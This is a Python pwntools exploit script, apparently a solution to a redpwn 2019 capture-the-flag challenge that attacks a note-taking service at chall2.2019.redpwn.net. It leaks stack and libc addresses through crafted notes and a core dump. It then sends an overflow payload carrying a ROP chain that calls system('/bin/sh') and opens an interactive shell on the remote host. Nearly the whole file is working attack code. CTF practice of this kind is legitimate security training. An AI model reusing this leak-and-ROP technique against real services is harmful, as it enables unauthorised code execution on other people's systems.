#wireshark filter = (ip.src == 192.168.154.133 || ip.dst == 192.168.154.133) && !(ip.dst_host contains google) && !(ip.src_host contains google) && tcp && (ip.dst_host == chall2.2019.redpwn.net || ip.src_host == chall2.2019.redpwn.net)

'''
protection:
    FULL RELRO
    NX
    PIE
    NO CANARY

commands:
    //command = read(stdin,buf,2)
    0 [tlen] [title]   : create note with title
      [clen] [content] : input content
    1 [tlen] [title]   : edit note with name
      [clen] [content] : input content
    2 : show all note(title+content)
    3 [tlen] [title] : delete note with title
    4 [tlen] [title] : show note with title
'''

from pwn import *
from Crypto.Util.number import long_to_bytes

context.arch = 'amd64'

###Util
def create(tlen,title,clen,content):
    r.send('0\n')
    r.sendline(str(tlen))
    r.sendline(title)
    r.sendline(str(clen))
    r.sendline(content)

def edit(tlen,title,clen,content):
    r.send('1\n')
    r.sendline(str(tlen))
    r.sendline(title)
    r.sendline(str(clen))
    r.sendline(content)

def show_all():
    r.send('2\n')

def delete(tlen,title):
    r.send('3\n')
    r.sendline(str(tlen))
    r.sendline(title)

def get_disasm():
    f = open('code').read().strip()
    N = ''
    for i in f:
        if i!=' ' and i!='\n':
            N+=i
    code = long_to_bytes(int(N,16))
    print(len(code))
    f2 = open('notecore','rb').read()
    offset = f2.find(code)+2080
    code = code+f2[offset:offset+0x6a0]
    f3 = open('note_D','w')
    f3.write(disasm(code))
    f3.close()
    exit()


def leak_core():
    create(1,'a',1,'a'*0x2800)
    res = r.recvall()
    res = res.split(b'Segmentation fault      (core dumped) ./wrapper 2>&1\n')[1]
    f = open('notecore','wb')
    f.write(res)
    f.close()
    exit()

###Addr
#  libc2.23
__offset = 0x3d7b80
bin_sh_offset = 0x18cd57
system_offset = 0x45390

###ROPgadget
L_pop_rdi = 0x21102

###Exploit
r = remote('chall2.2019.redpwn.net',4012)
#leak_core()
#get_disasm

for i in range(96):
    create(1,'a',1,'a')
create(40,'b'*40,1,'b')
create(1,'a',1,'a')
create(24,'b'*24,12,'b'*4)
show_all()
for i in range(192):
    res = r.recvline()
stack = u64(r.recvline()[40:-3]+b'\x00\x00')
main_rbp = stack+0x7f0
print(hex(main_rbp))
for i in range(3):
    r.recvline()
__offset_addr = u64(r.recvline()[24:-3]+b'\x00\x00')
libc_base = __offset_addr-__offset
print(hex(libc_base))
r.recvline()

padding = b'a'*0x264+p16(0x101)+p16(0x101)+b'a'*8
fake_rbp = p64(main_rbp)
ROPchain  = p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)
ROPchain += p64(libc_base+system_offset)
payload = padding+fake_rbp+ROPchain
create(1,'a',1,payload)
r.interactive()
